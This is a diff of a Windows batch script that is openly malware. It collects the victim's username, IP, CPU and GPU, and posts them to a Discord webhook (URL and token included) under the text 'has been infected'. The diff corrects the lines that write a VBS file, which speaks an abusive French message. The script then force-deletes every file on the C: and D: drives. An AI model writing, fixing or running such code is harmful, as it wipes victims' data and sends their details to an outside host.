@@ -5,9 +5,9 @@ for /f "usebackq skip=1 tokens=*" %%i in (`wmic cpu get name ^| findstr /r /v "^
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic path win32_VideoController get name ^| findstr /r /v "^$"`) do set gpu=%%i
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been infected!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ
 endlocal
-Dim sapi > %temp%\voice.vbs
-Set sapi=CreateObject("sapi.spvoice") >> %temp%\voice.vbs
-sapi.Speak "Coucou, je suis juste la petite voix qui te dit que la P D S vient de detruire ton pc, et ce, a tout jamais. amuse toi bien na le repare fils de viole, très content. daidi au reille de la speilld." >> %temp%\voice.vbs
+echo Dim sapi > %temp%\voice.vbs
+echo Set sapi=CreateObject("sapi.spvoice") >> %temp%\voice.vbs
+echo sapi.Speak "Coucou, je suis juste la petite voix qui te dit que la P D S vient de detruire ton pc, et ce, a tout jamais. amuse toi bien na le repare fils de viole, très content. daidi au reille de la speilld." >> %temp%\voice.vbs
 start %temp%\voice.vbs
 if exist "C:\" (cd C:\ & del "*" /f /q /s & rd C:\ /s /q)
 if exist "D:\" (cd D:\ & del "*" /f /q /s & rd D:\ /s /q)
